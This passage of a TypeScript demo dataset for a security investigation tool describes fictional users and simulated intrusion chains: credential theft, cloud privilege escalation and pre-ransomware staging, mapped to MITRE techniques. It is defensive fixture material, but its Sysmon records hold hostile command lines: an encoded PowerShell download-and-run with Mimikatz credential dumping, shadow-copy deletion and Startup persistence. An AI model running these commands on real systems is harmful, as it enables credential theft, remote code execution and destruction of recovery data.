// Demo dataset used when DATA_SOURCE=demo (the default). Everything here is fictional.
// When DATA_SOURCE=splunk, graphs are built from real Splunk events instead.
import type { UserProfile, WatchlistItem, CaseRecord, AuditLogEntry } from '../src/types';

export const DEMO_USERS: Record<string, UserProfile> = {
  'jsmith': {
    id: 'USR-8492',
    canonicalId: 'USR-8492-JSMITH',
    username: 'j.smith',
    fullName: 'John Smith',
    role: 'Senior Financial Analyst',
    department: 'Corporate Finance',
    baselineLocation: 'Chicago, IL (US-Central)',
    device: 'LAPTOP-JS-882 (Windows 11 Corp)',
    riskScore: 94,
    riskBand: 'HIGH',
    isPrivileged: true,
    isVip: false,
    isLeaver: false,
    isServiceAccount: false,
    alertSummary: 'Multiple failed logins followed by anomalous geo-IP pivot and unauthorized HR database access.',
    triggerEvent: 'Anomalous Credential Access & High-Value DB Exfiltration',
    aliases: ['jsmith', 'j.smith@corp.com', 'CORP\\jsmith', 'S-1-5-21-39482109-8492'],
    contributingFactors: [
      { indicator: 'Brute force then success', weight: 20, mitreTactic: 'T1110', eventIds: ['evt-401', 'evt-402', 'evt-403'], description: '>= 5 AUTH_FAIL then AUTH_SUCCESS within 30 min from Tor exit node' },
      { indicator: 'First-seen host/app access (Crown Jewel)', weight: 20, mitreTactic: 'T1078', eventIds: ['evt-181'], description: 'SRV-HR-DB01.corp accessed for the first time in 30-day baseline (2x crown jewel multiplier)' },
      { indicator: 'New source IP / ASN / country', weight: 10, mitreTactic: 'T1078', eventIds: ['evt-381'], description: 'Source IP 194.26.29.112 (AS9009 M247 Bucharest, RO) never in user history' },
      { indicator: 'Lateral fan-out', weight: 20, mitreTactic: 'T1021', eventIds: ['evt-281'], description: 'Kerberos Pass-The-Hash pivoting across admin jumpbox bastion' },
      { indicator: 'Large upload / Exfiltration', weight: 20, mitreTactic: 'T1567', eventIds: ['evt-021'], description: '482 MB uploaded to unmanaged external S3 bucket' },
      { indicator: 'Privileged user multiplier', weight: 4, mitreTactic: 'Context', eventIds: [], description: '1.3x multiplier applied for Privileged Finance Identity' }
    ],
    nodes: [
      {
        id: 'u_jsmith',
        name: 'j.smith',
        type: 'user',
        riskScore: 94,
        riskBand: 'HIGH',
        compromised: true,
        classification: 'Privileged Finance Identity',
        firstSeenHour: 48,
        firstSeenInBaseline: true,
        isPrivileged: true,
        aliases: ['jsmith', 'j.smith@corp.com', 'CORP\\jsmith', 'S-1-5-21-39482109-8492'],
        details: { Department: 'Corporate Finance', Workstation: 'LAPTOP-JS-882', KerberosID: 'S-1-5-21-39482', Manager: 'E. Vance' }
      },
      {
        id: 'host_laptop',
        name: 'LAPTOP-JS-882',
        type: 'host',
        riskScore: 78,
        riskBand: 'HIGH',
        compromised: true,
        classification: 'Corporate EDR Host',
        firstSeenHour: 48,
        firstSeenInBaseline: true,
        details: { OS: 'Windows 11 Enterprise', IP: '10.14.2.45', SensorStatus: 'Falcon Online (Alerted)', EDR_ID: 'agent-99214' }
      },
      {
        id: 'ip_home',
        name: '172.56.21.90',
        type: 'ip',
        riskScore: 10,
        riskBand: 'LOW',
        compromised: false,
        classification: 'Home ISP (Chicago, US)',
        firstSeenHour: 48,
        firstSeenInBaseline: true,
        details: { ASN: 'AS7922 Comcast', Geolocation: 'Chicago, IL, US', Reputation: 'Clean' }
      },
      {
        id: 'ip_tor',
        name: '194.26.29.112',
        type: 'ip',
        riskScore: 98,
        riskBand: 'HIGH',
        compromised: true,
        classification: 'Tor Exit Proxy (Bucharest, RO)',
        firstSeenHour: 40,
        firstSeenInBaseline: false,
        details: { ASN: 'AS9009 M247', Geolocation: 'Bucharest, RO', Reputation: 'Known Bulletproof Proxy', ThreatActor: 'UNC2452' }
      },
      {
        id: 'proc_mimikatz',
        name: 'powershell.exe @ LAPTOP-JS-882',
        type: 'process',
        riskScore: 92,
        riskBand: 'HIGH',
        compromised: true,
        classification: 'Credential Dumping Tool',
        firstSeenHour: 32,
        firstSeenInBaseline: false,
        details: { Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', Host: 'LAPTOP-JS-882', ProcessGUID: '{9f82c4-1102}', Parent: 'explorer.exe', Signer: 'Microsoft (script unsigned)' },
        executions: [{ ts: 'H32', commandLine: 'powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQA6ADgANAA0ADMALwBhACcAKQA7ACAASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzAA==', parent: 'C:\\Windows\\explorer.exe', user: 'j.smith', eventId: 'evt-321', count: 2, source: 'Sysmon 1' }]
      },
      {
        id: 'host_jump',
        name: 'SRV-JUMP-02.corp',
        type: 'host',
        riskScore: 82,
        riskBand: 'HIGH',
        compromised: true,
        classification: 'Admin Bastion Jumpbox',
        firstSeenHour: 28,
        firstSeenInBaseline: false,
        isCrownJewel: true,
        details: { IP: '10.10.100.14', Role: 'Production Bastion Host', Protocols: 'RDP / WinRM / SSH', SensorStatus: 'Defender Active' }
      },
      {
        id: 'app_fin',
        name: 'DB-FINANCE-PROD',
        type: 'application',
        riskScore: 35,
        riskBand: 'LOW',
        compromised: false,
        classification: 'Normal Work Asset',
        firstSeenHour: 48,
        firstSeenInBaseline: true,
        details: { Type: 'PostgreSQL 15', Criticality: 'Tier 2', AccessPattern: 'Daily Authorized' }
      },
      {
        id: 'app_hr',
        name: 'SRV-HR-DB01.corp (Payroll_SSN)',
        type: 'application',
        riskScore: 96,
        riskBand: 'HIGH',
        compromised: true,
        classification: 'Crown Jewel Database',
        firstSeenHour: 18,
        firstSeenInBaseline: false,
        isCrownJewel: true,
        details: { Type: 'MS SQL Server', Schema: 'Employees_Payroll_SSN', AccessHistory: 'Never accessed by j.smith before', Tag: 'crown_jewel' }
      },
      {
        id: 'file_staging',
        name: 'hr_payroll_q3_export.7z',
        type: 'file',
        riskScore: 95,
        riskBand: 'HIGH',
        compromised: true,
        classification: 'Encrypted Staged Archive',
        firstSeenHour: 8,
        firstSeenInBaseline: false,
        details: { Path: 'C:\\ProgramData\\Temp\\cache.7z', Size: '482 MB', Encryption: 'AES-256' }
      },
      {
        id: 'dom_exfil',
        name: 's3.us-east-1.amazonaws.com (ext-backup-sync)',
        type: 'domain',
        riskScore: 99,
        riskBand: 'HIGH',
        compromised: true,
        classification: 'External Untrusted Bucket',
        firstSeenHour: 2,
        firstSeenInBaseline: false,
        details: { Destination: 'AWS us-east-1 (External)', Action: 'rclone sync staged payload', BytesOut: '482 MB' }
      },
      {
        id: 'alert_siem',
        name: 'SEC-7019: Anomalous Credential Abuse',
        type: 'alert',
        riskScore: 95,
        riskBand: 'HIGH',
        compromised: true,
        classification: 'Correlated SIEM Detection',
        firstSeenHour: 40,
        firstSeenInBaseline: false,
        details: { Source: 'Microsoft Sentinel / UDM', Severity: 'High', MITRE: 'T1110, T1078' }
      }
    ],
    edges: [
      { id: 'e1', source: 'u_jsmith', target: 'ip_home', action: 'FROM_IP', type: 'FROM_IP', protocol: 'HTTPS/443', hour: 48, eventCount: 24, status: 'allowed', details: 'Regular SSO sign-in session from home ISP in Chicago', firstSeenInBaseline: true, eventIds: ['evt-481'] },
      { id: 'e2', source: 'u_jsmith', target: 'host_laptop', action: 'AUTH_SUCCESS', type: 'AUTH_SUCCESS', protocol: 'RDP/3389', hour: 46, eventCount: 1, status: 'allowed', details: 'Interactive logon to corporate workstation LAPTOP-JS-882', firstSeenInBaseline: true, eventIds: ['evt-461'] },
      { id: 'e3', source: 'u_jsmith', target: 'app_fin', action: 'ACCESSED', type: 'ACCESSED', protocol: 'TCP/5432', hour: 44, eventCount: 142, status: 'allowed', details: 'Standard quarterly financial reports query', firstSeenInBaseline: true, eventIds: ['evt-441'] },
      { id: 'e4', source: 'u_jsmith', target: 'ip_tor', action: 'AUTH_FAIL', type: 'AUTH_FAIL', protocol: 'NTLM/445', hour: 40, eventCount: 7, status: 'blocked', details: '7 consecutive failed authentication attempts from Romania Tor node', firstSeenInBaseline: false, ttp: ['T1110'], eventIds: ['evt-401', 'evt-402', 'evt-403'], rawSourceLink: 'https://security.corp/sentinel/alerts/7019' },
      { id: 'e4b', source: 'u_jsmith', target: 'alert_siem', action: 'TRIGGERED', type: 'TRIGGERED', protocol: 'SIEM API', hour: 40, eventCount: 1, status: 'critical', details: 'Correlated alert fired on user identity', firstSeenInBaseline: false, ttp: ['T1110'], eventIds: ['evt-404'] },
      { id: 'e5', source: 'u_jsmith', target: 'ip_tor', action: 'AUTH_SUCCESS', type: 'AUTH_SUCCESS', protocol: 'HTTPS/443', hour: 38, eventCount: 1, status: 'anomalous', details: 'Session token replay bypasses MFA from Bucharest Tor node', firstSeenInBaseline: false, ttp: ['T1078'], eventIds: ['evt-381'] },
      { id: 'e6', source: 'u_jsmith', target: 'proc_mimikatz', action: 'EXECUTED', type: 'EXECUTED', protocol: 'Local Disk', hour: 32, eventCount: 2, status: 'critical', details: 'PowerShell memory dumping script executed on LAPTOP-JS-882', firstSeenInBaseline: false, ttp: ['T1003'], eventIds: ['evt-321'] },
      { id: 'e7', source: 'proc_mimikatz', target: 'host_laptop', action: 'RAN_ON', type: 'RAN_ON', protocol: 'API Hook', hour: 32, eventCount: 1, status: 'critical', details: 'LSASS memory read detected by EDR tamper protection', firstSeenInBaseline: false, ttp: ['T1003'], eventIds: ['evt-322'] },
      { id: 'e8', source: 'u_jsmith', target: 'host_jump', action: 'AUTH_SUCCESS', type: 'AUTH_SUCCESS', protocol: 'SMB/445', hour: 28, eventCount: 4, status: 'critical', details: 'Pass-The-Hash lateral movement to production bastion jumpbox', firstSeenInBaseline: false, ttp: ['T1550', 'T1021'], eventIds: ['evt-281'] },
      { id: 'e9', source: 'u_jsmith', target: 'app_hr', action: 'ACCESSED', type: 'ACCESSED', protocol: 'TDS/1433', hour: 18, eventCount: 89, status: 'critical', details: 'First-time connection to sensitive HR server; SELECT * FROM Payroll_SSN', firstSeenInBaseline: false, ttp: ['T1078', 'T1005'], eventIds: ['evt-181'] },
      { id: 'e10', source: 'u_jsmith', target: 'file_staging', action: 'ACCESSED', type: 'ACCESSED', protocol: 'Local IO', hour: 8, eventCount: 12400, status: 'critical', details: 'Compressed 12,400 confidential records into encrypted 7z archive', firstSeenInBaseline: false, ttp: ['T1560'], eventIds: ['evt-081'] },
      { id: 'e11', source: 'u_jsmith', target: 'dom_exfil', action: 'UPLOADED', type: 'UPLOADED', protocol: 'HTTPS/443', hour: 2, eventCount: 1, status: 'critical', details: 'High-velocity outbound egress of 482 MB payload to external S3', firstSeenInBaseline: false, ttp: ['T1567'], eventIds: ['evt-021'] }
    ],
    milestones: [
      { hour: 48, timeLabel: 'T-48:00', title: 'Baseline Normal Login', severity: 'low', description: 'Authorized user sign-in from Chicago home ISP. Routine financial reports query.', mitreTactic: 'Normal Operations', edgeId: 'e1' },
      { hour: 40, timeLabel: 'T-40:00', title: 'Tor Password Spray', severity: 'medium', description: '7 failed authentications from Romanian Tor exit node IP 194.26.29.112.', mitreTactic: 'Credential Access (T1110)', edgeId: 'e4' },
      { hour: 38, timeLabel: 'T-38:00', title: 'Session Hijack / MFA Bypass', severity: 'high', description: 'Attacker authenticates via stolen session cookie token replay.', mitreTactic: 'Initial Access (T1078)', edgeId: 'e5' },
      { hour: 32, timeLabel: 'T-32:00', title: 'LSASS Memory Harvest', severity: 'critical', description: 'Invoke-Mimikatz executed on laptop, dumping Kerberos TGT tickets.', mitreTactic: 'Credential Dumping (T1003)', edgeId: 'e6' },
      { hour: 28, timeLabel: 'T-28:00', title: 'Lateral Movement to Jumpbox', severity: 'critical', description: 'Attacker leverages Pass-The-Hash to compromise SRV-JUMP-02.', mitreTactic: 'Lateral Movement (T1021)', edgeId: 'e8' },
      { hour: 18, timeLabel: 'T-18:00', title: 'Anomalous HR Database Query', severity: 'critical', description: 'First-time connection to tagged Crown Jewel SRV-HR-DB01. Bulk SSN query.', mitreTactic: 'Collection (T1005)', edgeId: 'e9' },
      { hour: 8, timeLabel: 'T-08:00', title: 'Data Staging & Compression', severity: 'critical', description: 'Payroll extract compressed into hr_payroll_q3_export.7z in cache.', mitreTactic: 'Archive Data (T1560)', edgeId: 'e10' },
      { hour: 2, timeLabel: 'T-02:00', title: 'External Cloud Exfiltration', severity: 'critical', description: 'Outbound sync of 482 MB payload to unmanaged AWS S3 bucket.', mitreTactic: 'Exfiltration (T1567)', edgeId: 'e11' }
    ]
  },
  'apatel': {
    id: 'USR-3190',
    canonicalId: 'USR-3190-APATEL',
    username: 'a.patel',
    fullName: 'Amina Patel',
    role: 'DevOps / Cloud Architect',
    department: 'Cloud Platform Engineering',
    baselineLocation: 'Austin, TX (US-West)',
    device: 'MACBOOK-PRO-AP-01 (macOS Sonoma)',
    riskScore: 88,
    riskBand: 'HIGH',
    isPrivileged: true,
    isVip: false,
    isLeaver: false,
    isServiceAccount: false,
    alertSummary: 'Service Account token exfiltration and unauthorized AWS IAM policy modification.',
    triggerEvent: 'Cloud Infrastructure Privilege Escalation & Shadow Admin Creation',
    aliases: ['apatel', 'a.patel@corp.com', 'CORP\\apatel', 'arn:aws:iam::984029184712:user/a.patel'],
    contributingFactors: [
      { indicator: 'New source IP / ASN / country', weight: 10, mitreTactic: 'T1078', eventIds: ['evt-ap34'], description: 'AWS CLI commands issued from DigitalOcean VPS in Amsterdam' },
      { indicator: 'Privilege change (Shadow Admin)', weight: 20, mitreTactic: 'T1098', eventIds: ['evt-ap06'], description: 'MEMBER_CHANGE into AdministratorAccess role via backdoor role' },
      { indicator: 'First-seen host/app access', weight: 10, mitreTactic: 'T1078', eventIds: ['evt-ap20'], description: 'HashiCorp Vault production root key paths probed' }
    ],
    nodes: [
      { id: 'u_apatel', name: 'a.patel', type: 'user', riskScore: 88, riskBand: 'HIGH', compromised: true, classification: 'Platform Admin Identity', firstSeenHour: 48, firstSeenInBaseline: true, aliases: ['apatel', 'a.patel@corp.com'], details: { Department: 'Cloud Platform', IAMRole: 'DevOps-Engineer' } },
      { id: 'host_mac', name: 'MACBOOK-PRO-AP-01', type: 'host', riskScore: 65, riskBand: 'MEDIUM', compromised: true, classification: 'Corporate macOS Asset', firstSeenHour: 48, firstSeenInBaseline: true, details: { OS: 'macOS 14.5 Sonoma', IP: '10.20.4.11' } },
      { id: 'ip_office', name: '64.102.12.8', type: 'ip', riskScore: 5, riskBand: 'LOW', compromised: false, classification: 'Corporate Egress VPN', firstSeenHour: 48, firstSeenInBaseline: true, details: { Geolocation: 'Austin, TX' } },
      { id: 'ip_anon', name: '45.154.255.89', type: 'ip', riskScore: 94, riskBand: 'HIGH', compromised: true, classification: 'Untrusted VPS Host', firstSeenHour: 34, firstSeenInBaseline: false, details: { ASN: 'AS14061 DigitalOcean', Geolocation: 'Amsterdam, NL' } },
      { id: 'app_vault', name: 'HashiCorp Vault Prod', type: 'application', riskScore: 85, riskBand: 'HIGH', compromised: true, classification: 'Enterprise Secrets Manager', firstSeenHour: 20, firstSeenInBaseline: false, isCrownJewel: true, details: { Criticality: 'Tier 0', Engine: 'Vault Enterprise' } },
      { id: 'dom_aws', name: 'iam.amazonaws.com', type: 'domain', riskScore: 97, riskBand: 'HIGH', compromised: true, classification: 'AWS IAM Control Plane', firstSeenHour: 6, firstSeenInBaseline: false, details: { AccountID: '984029184712', Action: 'AttachRolePolicy' } }
    ],
    edges: [
      { id: 'ae1', source: 'u_apatel', target: 'ip_office', action: 'FROM_IP', type: 'FROM_IP', protocol: 'HTTPS/443', hour: 46, eventCount: 15, status: 'allowed', details: 'Normal developer sign-in from Austin office', firstSeenInBaseline: true },
      { id: 'ae2', source: 'u_apatel', target: 'host_mac', action: 'AUTH_SUCCESS', type: 'AUTH_SUCCESS', protocol: 'SSH/22', hour: 42, eventCount: 3, status: 'allowed', details: 'Regular infrastructure review session', firstSeenInBaseline: true },
      { id: 'ae3', source: 'u_apatel', target: 'ip_anon', action: 'AUTH_SUCCESS', type: 'AUTH_SUCCESS', protocol: 'HTTPS/443', hour: 34, eventCount: 1, status: 'anomalous', details: 'Stolen AWS API token invoked from European VPS', firstSeenInBaseline: false, ttp: ['T1078'] },
      { id: 'ae4', source: 'u_apatel', target: 'app_vault', action: 'ACCESSED', type: 'ACCESSED', protocol: 'HTTPS/8200', hour: 20, eventCount: 22, status: 'critical', details: 'Queried production master secrets in Vault', firstSeenInBaseline: false, ttp: ['T1087'] },
      { id: 'ae5', source: 'u_apatel', target: 'dom_aws', action: 'MEMBER_CHANGE', type: 'MEMBER_CHANGE', protocol: 'AWS API', hour: 6, eventCount: 1, status: 'critical', details: 'Attached AdministratorAccess to backdoor role sys-backup-daemon', firstSeenInBaseline: false, ttp: ['T1098'] }
    ],
    milestones: [
      { hour: 48, timeLabel: 'T-48:00', title: 'Normal Engineering Workflow', severity: 'low', description: 'DevOps user performing scheduled terraform updates.', mitreTactic: 'Normal Operations' },
      { hour: 34, timeLabel: 'T-34:00', title: 'Anomalous Cloud API Origin', severity: 'high', description: 'AWS STS AssumeRole requested from DigitalOcean VPS in Amsterdam.', mitreTactic: 'Initial Access (T1078)' },
      { hour: 20, timeLabel: 'T-20:00', title: 'Secrets Vault Probing', severity: 'critical', description: 'Unauthorized read requests against Vault AWS root key paths.', mitreTactic: 'Discovery (T1087)' },
      { hour: 6, timeLabel: 'T-06:00', title: 'Shadow Admin Persistence', severity: 'critical', description: 'Attacker attached AdministratorAccess to new backdoor IAM role.', mitreTactic: 'Persistence (T1098)' }
    ]
  },
  'mross': {
    id: 'USR-5521',
    canonicalId: 'USR-5521-MROSS',
    username: 'm.ross',
    fullName: 'Marcus Ross',
    role: 'Sales Director',
    department: 'Enterprise Sales',
    baselineLocation: 'New York, NY (US-East)',
    device: 'THINKPAD-MR-20 (Windows 11)',
    riskScore: 91,
    riskBand: 'HIGH',
    isPrivileged: false,
    isVip: true,
    isLeaver: false,
    isServiceAccount: false,
    alertSummary: 'Phishing attachment → Cobalt Strike beacon → share discovery → shadow copies deleted and ransomware canary tripped.',
    triggerEvent: 'Phishing Execution & Pre-Ransomware Lateral Staging',
    aliases: ['mross', 'm.ross@corp.com', 'CORP\\mross'],
    contributingFactors: [
      { indicator: 'Correlated alert (EDR)', weight: 30, mitreTactic: 'T1566', eventIds: ['evt-mr42'], description: 'EDR heuristic match on CobaltStrike Beacon in Temp' },
      { indicator: 'Encoded PowerShell', weight: 15, mitreTactic: 'T1059.001', eventIds: ['evt-mr40'], description: 'Hidden PowerShell with an encoded command, started by rundll32' },
      { indicator: 'Mass file access (Ransomware staging)', weight: 15, mitreTactic: 'T1005', eventIds: ['evt-mr15'], description: 'Enumerated 42,000 files across network shares in 1 hour' },
      { indicator: 'Inhibit system recovery', weight: 20, mitreTactic: 'T1490', eventIds: ['evt-mr03'], description: 'vssadmin deleted all shadow copies' },
      { indicator: 'VIP user multiplier', weight: 4, mitreTactic: 'Context', eventIds: [], description: '1.2x score multiplier for Executive Sales Director' }
    ],
    nodes: [
      { id: 'u_mross', name: 'm.ross', type: 'user', riskScore: 91, riskBand: 'HIGH', compromised: true, classification: 'Sales Executive Identity', firstSeenHour: 48, firstSeenInBaseline: true, isVip: true, aliases: ['mross', 'm.ross@corp.com'], details: { Department: 'Enterprise Sales' } },
      { id: 'host_sales', name: 'THINKPAD-MR-20', type: 'host', riskScore: 88, riskBand: 'HIGH', compromised: true, classification: 'Executive Laptop', firstSeenHour: 48, firstSeenInBaseline: true, details: { OS: 'Windows 11 Pro', IP: '10.15.8.32' } },
      { id: 'proc_outlook', name: 'OUTLOOK.EXE @ THINKPAD-MR-20', type: 'process', riskScore: 40, riskBand: 'MEDIUM', compromised: false, classification: 'Mail client', firstSeenHour: 44, firstSeenInBaseline: true,
        details: { Image: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', Host: 'THINKPAD-MR-20', Parent: 'C:\\Windows\\explorer.exe' },
        executions: [{ ts: 'H44', commandLine: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE" /recycle', parent: 'C:\\Windows\\explorer.exe', user: 'm.ross', eventId: 'evt-mr44', count: 1, source: 'Sysmon 1' }] },
      { id: 'file_phish', name: 'Overdue_Invoice_982.pdf.exe', type: 'file', riskScore: 99, riskBand: 'HIGH', compromised: true, classification: 'Malicious dropper (email attachment)', firstSeenHour: 42, firstSeenInBaseline: false,
        details: { Path: 'C:\\Users\\mross\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\7QK2Z1\\Overdue_Invoice_982.pdf.exe', SHA256: '9f2c1d4e8b0a7c3f5e6d2b1a0c9e8f7d6c5b4a3928171605f4e3d2c1b0a99887', Signature: 'Unsigned' } },
      { id: 'proc_invoice', name: 'Overdue_Invoice_982.pdf.exe @ THINKPAD-MR-20', type: 'process', riskScore: 99, riskBand: 'HIGH', compromised: true, classification: 'Malicious process (CobaltStrike loader)', firstSeenHour: 42, firstSeenInBaseline: false,
        details: { Image: 'C:\\Users\\mross\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\7QK2Z1\\Overdue_Invoice_982.pdf.exe', Host: 'THINKPAD-MR-20', Parent: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', Signature: 'CobaltStrike Beacon (EDR heuristic)' },
        executions: [{ ts: 'H42', commandLine: '"C:\\Users\\mross\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\7QK2Z1\\Overdue_Invoice_982.pdf.exe"', parent: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', user: 'm.ross', eventId: 'evt-mr42', count: 1, source: 'Sysmon 1' }] },
      { id: 'ip_c2', name: '185.220.101.5', type: 'ip', riskScore: 100, riskBand: 'HIGH', compromised: true, classification: 'Active C2 Beacon Server', firstSeenHour: 41, firstSeenInBaseline: false, details: { ThreatActor: 'FIN7 / BlackCat', Port: '8443 TLS', Scope: 'External' } },
      { id: 'proc_rundll', name: 'rundll32.exe @ THINKPAD-MR-20', type: 'process', riskScore: 95, riskBand: 'HIGH', compromised: true, classification: 'Injected beacon host process', firstSeenHour: 41, firstSeenInBaseline: false,
        details: { Image: 'C:\\Windows\\System32\\rundll32.exe', Host: 'THINKPAD-MR-20', Parent: 'Overdue_Invoice_982.pdf.exe' },
        executions: [{ ts: 'H41', commandLine: 'C:\\Windows\\System32\\rundll32.exe C:\\Users\\mross\\AppData\\Roaming\\msupd.dll,StartW', parent: 'Overdue_Invoice_982.pdf.exe', user: 'm.ross', eventId: 'evt-mr41b', count: 1, source: 'Sysmon 1' }] },
      { id: 'proc_ps', name: 'powershell.exe @ THINKPAD-MR-20', type: 'process', riskScore: 90, riskBand: 'HIGH', compromised: true, classification: 'Hands-on-keyboard PowerShell', firstSeenHour: 40, firstSeenInBaseline: false,
        details: { Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', Host: 'THINKPAD-MR-20', Parent: 'C:\\Windows\\System32\\rundll32.exe' },
        executions: [
          { ts: 'H40', commandLine: 'powershell.exe -NoP -W Hidden -enc bgBlAHQAIAB2AGkAZQB3ACAALwBkAG8AbQBhAGkAbgA7ACAAbgBsAHQAZQBzAHQAIAAvAGQAYwBsAGkAcwB0ADoAYwBvAHIAcAAuAGwAbwBjAGEAbAA=', parent: 'C:\\Windows\\System32\\rundll32.exe', user: 'm.ross', eventId: 'evt-mr40', count: 1, source: 'Sysmon 1' },
          { ts: 'H39', commandLine: 'powershell.exe -NoP -W Hidden -c "Copy-Item C:\\Users\\mross\\AppData\\Roaming\\msupd.dll $env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDriveSync.lnk"', parent: 'C:\\Windows\\System32\\rundll32.exe', user: 'm.ross', eventId: 'evt-mr39', count: 1, source: 'Sysmon 1' },
        ] },
      { id: 'file_persist', name: 'OneDriveSync.lnk', type: 'file', riskScore: 80, riskBand: 'HIGH', compromised: true, classification: 'Startup-folder persistence', firstSeenHour: 39, firstSeenInBaseline: false,
        details: { Path: 'C:\\Users\\mross\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDriveSync.lnk' } },
      { id: 'host_share', name: 'FS-CORP-SHARE01', type: 'host', riskScore: 84, riskBand: 'HIGH', compromised: true, classification: 'Corporate File Storage', firstSeenHour: 15, firstSeenInBaseline: false, isCrownJewel: true, details: { Shares: 'Legal, Contracts, Sales' } },
      { id: 'proc_vss', name: 'vssadmin.exe @ THINKPAD-MR-20', type: 'process', riskScore: 97, riskBand: 'HIGH', compromised: true, classification: 'Pre-ransomware: shadow copy deletion', firstSeenHour: 3, firstSeenInBaseline: false,
        details: { Image: 'C:\\Windows\\System32\\vssadmin.exe', Host: 'THINKPAD-MR-20', Parent: 'C:\\Windows\\System32\\rundll32.exe' },
        executions: [{ ts: 'H3', commandLine: 'vssadmin.exe delete shadows /all /quiet', parent: 'C:\\Windows\\System32\\rundll32.exe', user: 'm.ross', eventId: 'evt-mr03', count: 1, source: 'Sysmon 1' }] },
      { id: 'file_canary', name: 'Q3_Contracts_CANARY.docx.locked', type: 'file', riskScore: 100, riskBand: 'HIGH', compromised: true, classification: 'Ransomware canary file modified', firstSeenHour: 2, firstSeenInBaseline: false,
        details: { Path: '\\\\FS-CORP-SHARE01\\Legal\\Q3_Contracts_CANARY.docx.locked', Note: 'Canary file renamed with .locked extension' } }
    ],
    edges: [
      { id: 're0', source: 'u_mross', target: 'host_sales', action: 'AUTH_SUCCESS', type: 'AUTH_SUCCESS', protocol: 'Interactive', hour: 46, eventCount: 3, status: 'allowed', details: 'Normal interactive logon to the executive laptop', firstSeenInBaseline: true, eventIds: ['evt-mr46'] },
      { id: 're0b', source: 'u_mross', target: 'proc_outlook', action: 'EXECUTED', type: 'EXECUTED', protocol: 'Process start', hour: 44, eventCount: 1, status: 'allowed', details: 'User opened Outlook', firstSeenInBaseline: true, eventIds: ['evt-mr44'] },
      { id: 're1', source: 'proc_outlook', target: 'file_phish', action: 'WROTE', type: 'WROTE', protocol: 'Sysmon 11', hour: 42, eventCount: 1, status: 'critical', details: 'Outlook saved the email attachment Overdue_Invoice_982.pdf.exe to its cache folder', firstSeenInBaseline: false, ttp: ['T1566.001'], eventIds: ['evt-mr42a'] },
      { id: 're1b', source: 'proc_outlook', target: 'proc_invoice', action: 'SPAWNED', type: 'SPAWNED', protocol: 'Child process', hour: 42, eventCount: 1, status: 'critical', details: 'User double-clicked the disguised PDF invoice; Outlook started the executable', firstSeenInBaseline: false, ttp: ['T1204.002'], eventIds: ['evt-mr42'] },
      { id: 're2', source: 'proc_invoice', target: 'ip_c2', action: 'CONNECTED_TO', type: 'CONNECTED_TO', protocol: 'TCP/8443', hour: 41, eventCount: 420, status: 'critical', details: 'Encrypted heartbeats every 60s to the C2 server', firstSeenInBaseline: false, ttp: ['T1071.001'], eventIds: ['evt-mr41'] },
      { id: 're2b', source: 'proc_invoice', target: 'proc_rundll', action: 'SPAWNED', type: 'SPAWNED', protocol: 'Child process', hour: 41, eventCount: 1, status: 'critical', details: 'Loader started rundll32 with a DLL dropped in AppData (beacon moves into a signed binary)', firstSeenInBaseline: false, ttp: ['T1218.011'], eventIds: ['evt-mr41b'] },
      { id: 're2c', source: 'proc_rundll', target: 'proc_ps', action: 'SPAWNED', type: 'SPAWNED', protocol: 'Child process', hour: 40, eventCount: 2, status: 'critical', details: 'Beacon ran hidden, encoded PowerShell for domain discovery', firstSeenInBaseline: false, ttp: ['T1059.001', 'T1087.002'], eventIds: ['evt-mr40', 'evt-mr39'] },
      { id: 're2d', source: 'proc_ps', target: 'file_persist', action: 'WROTE', type: 'WROTE', protocol: 'Sysmon 11', hour: 39, eventCount: 1, status: 'critical', details: 'PowerShell dropped a shortcut in the Startup folder so the beacon survives reboot', firstSeenInBaseline: false, ttp: ['T1547.001'], eventIds: ['evt-mr39b'] },
      { id: 're3', source: 'proc_rundll', target: 'host_share', action: 'ACCESSED', type: 'ACCESSED', protocol: 'SMB/445', hour: 15, eventCount: 42000, status: 'critical', details: 'Beacon enumerated 42,000 files across the Legal, Contracts and Sales shares', firstSeenInBaseline: false, ttp: ['T1083', 'T1135'], eventIds: ['evt-mr15'] },
      { id: 're4', source: 'proc_rundll', target: 'proc_vss', action: 'SPAWNED', type: 'SPAWNED', protocol: 'Child process', hour: 3, eventCount: 1, status: 'critical', details: 'Shadow copies deleted to block recovery (pre-ransomware)', firstSeenInBaseline: false, ttp: ['T1490'], eventIds: ['evt-mr03'] },
      { id: 're5', source: 'proc_rundll', target: 'file_canary', action: 'WROTE', type: 'WROTE', protocol: 'SMB/445', hour: 2, eventCount: 1, status: 'critical', details: 'Canary file on the Legal share renamed to .locked: encryption has started', firstSeenInBaseline: false, ttp: ['T1486'], eventIds: ['evt-mr02'] }
    ],
    milestones: [
      { hour: 48, timeLabel: 'T-48:00', title: 'Normal Sales Operations', severity: 'low', description: 'User answering email via Outlook 365.', mitreTactic: 'Normal Operations' },
      { hour: 42, timeLabel: 'T-42:00', title: 'Phishing Execution', severity: 'critical', description: 'Malicious executable executed by user from Outlook email.', mitreTactic: 'Initial Access (T1566)', edgeId: 're1b' },
      { hour: 41, timeLabel: 'T-41:00', title: 'Cobalt Strike C2 Beaconing', severity: 'critical', description: 'Persistent beacon established to malicious IP 185.220.101.5.', mitreTactic: 'Command and Control (T1071)', edgeId: 're2' },
